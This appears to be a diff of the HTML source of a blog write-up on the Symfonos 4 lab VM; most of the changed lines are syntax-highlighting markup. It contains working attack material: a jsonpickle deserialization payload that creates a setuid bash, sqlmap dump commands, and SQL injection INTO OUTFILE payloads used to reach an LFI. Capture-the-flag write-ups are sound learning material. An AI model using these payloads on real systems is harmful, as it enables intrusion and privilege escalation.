@@ -22,26 +22,27 @@ we exploit the lfi. For that we poison ssh logs for exploitation to rce. For pri
 a python web app running locally as root using insecure deserialization of the cookie by jsonpickle.&lt;/p>
 &lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
 &lt;p>Nmap&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.105
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.00033s latency&lt;span style="color:#f92672">)&lt;/span>.
-PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH 7.9p1 Debian &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
-| ssh-hostkey:
-| &lt;span style="color:#ae81ff">2048&lt;/span> f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
-| &lt;span style="color:#ae81ff">256&lt;/span> be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
-|_ &lt;span style="color:#ae81ff">256&lt;/span> 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
-80/tcp open http Apache httpd 2.4.38 &lt;span style="color:#f92672">((&lt;/span>Debian&lt;span style="color:#f92672">))&lt;/span>
-|_http-server-header: Apache/2.4.38 &lt;span style="color:#f92672">(&lt;/span>Debian&lt;span style="color:#f92672">)&lt;/span>
-|_http-title: Site doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t have a title &lt;span style="color:#f92672">(&lt;/span>text/html&lt;span style="color:#f92672">)&lt;/span>.
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.105
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.00033s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.9p1 Debian &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2048&lt;/span> f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">256&lt;/span> be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#ae81ff">256&lt;/span> 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.38 &lt;span style="color:#f92672">((&lt;/span>Debian&lt;span style="color:#f92672">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.38 &lt;span style="color:#f92672">(&lt;/span>Debian&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Site doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t have a title &lt;span style="color:#f92672">(&lt;/span>text/html&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
 &lt;h2 id="http-80">HTTP (80)&lt;/h2>
 &lt;p>On the browser, the only thing that is served is an image. Therefore we need to bruteforce for directories
 and files.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-26.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Performing a bruteforce with ffuf we get a &lt;strong>gods&lt;/strong> directory.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u http://192.168.56.105/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e / -fc &lt;span style="color:#ae81ff">403&lt;/span> | tee root.ffuf
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ffuf -ic -c -u http://192.168.56.105/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e / -fc &lt;span style="color:#ae81ff">403&lt;/span> | tee root.ffuf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>In this directory we only have some files, with nothing useful in them.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
@@ -89,16 +90,18 @@ path to privesc.&lt;/p>
 &lt;p>Based on the use of pickle, we need to exploit deserialization through the cookie.&lt;/p>
 &lt;p>I came up with the below script to generate a base64 encoded cookie which when deserialized
 will create a setuid binary of bash.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#f92672">import&lt;/span> jsonpickle
-&lt;span style="color:#f92672">import&lt;/span> base64
-&lt;span style="color:#f92672">import&lt;/span> os
-&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">RCE&lt;/span>(object):
-&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">__reduce__&lt;/span>(self):
-cmd &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#e6db74">&amp;#39;cp /bin/bash /tmp/suidbash;chmod +s /tmp/suidbash&amp;#39;&lt;/span>)
-&lt;span style="color:#66d9ef">return&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>system, (cmd,)
-encoded &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64encode(jsonpickle&lt;span style="color:#f92672">.&lt;/span>encode(RCE()))
-&lt;span style="color:#66d9ef">print&lt;/span>(encoded)
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> jsonpickle
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> base64
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">RCE&lt;/span>(object):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">__reduce__&lt;/span>(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cmd &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#e6db74">&amp;#39;cp /bin/bash /tmp/suidbash;chmod +s /tmp/suidbash&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>system, (cmd,)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>encoded &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64encode(jsonpickle&lt;span style="color:#f92672">.&lt;/span>encode(RCE()))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(encoded)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-22.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Setting the cookie and sending the request using burpsuite:&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-23.png" alt="symfonos" class="center" style="border-radius: 8px;" />
@@ -117,14 +120,14 @@ the &lt;code>$_SESSION['logged_in']&lt;/code> is set to false.&lt;/p>
 &lt;p>This is a blind boolean sql injection. We can intercept the request with burpsuite and save the request to file
 and exploit this with sqlmap.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-28.png" alt="symfonos" class="center" style="border-radius: 8px;" />
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sqlmap -r atlantis.req --batch --dump --level&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span> --risk&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span> --threads&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>I was able to dump creds but they weren&amp;rsquo;t useful as I couldn&amp;rsquo;t crack the hash.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sqlmap -r atlantis.req --batch --dump --level&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span> --risk&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span> --threads&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I was able to dump creds but they weren&amp;rsquo;t useful as I couldn&amp;rsquo;t crack the hash.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-11.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Since we can run sql queries, we can try and write to a file and access it using the lfi. During exploiting of this box
 I tried this but couldn&amp;rsquo;t figure out why it failed but on revisiting it afterwards I figured out the issue.&lt;/p>
 &lt;p>Using this payload in my post request to write to a file using select, we don&amp;rsquo;t get the usual redirect that
 signifies that the query was successful.&lt;/p>
-&lt;pre>&lt;code>username=admin' and 1=2 Union Select 1,'2' INTO OUTFILE '/tmp/test.log'-- -&amp;amp;password=a
+&lt;pre tabindex="0">&lt;code>username=admin&amp;#39; and 1=2 Union Select 1,&amp;#39;2&amp;#39; INTO OUTFILE &amp;#39;/tmp/test.log&amp;#39;-- -&amp;amp;password=a
 &lt;/code>&lt;/pre>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-29.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>The file is actually written to disk if we check the /tmp folder.&lt;/p>
@@ -142,7 +145,7 @@ we need folders that the mysql user can write. I discovered /var/lib/mysql and /
 &lt;p>Something else to note is that if a file exists, sql will not overwrite it. Therefore if you need to make changes to
 what you&amp;rsquo;re writing you&amp;rsquo;ll need to write to another non-existent file.&lt;/p>
 &lt;p>Testing this using /var/lib/mysql the file gets written.&lt;/p>
-&lt;pre>&lt;code>username=admin' and 1=2 Union Select 1,'test' INTO OUTFILE '/var/lib/mysql/123456.log'-- -&amp;amp;password=a
+&lt;pre tabindex="0">&lt;code>username=admin&amp;#39; and 1=2 Union Select 1,&amp;#39;test&amp;#39; INTO OUTFILE &amp;#39;/var/lib/mysql/123456.log&amp;#39;-- -&amp;amp;password=a
 &lt;/code>&lt;/pre>
 &lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-33.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Then accessing it using the lfi works this time.&lt;/p>
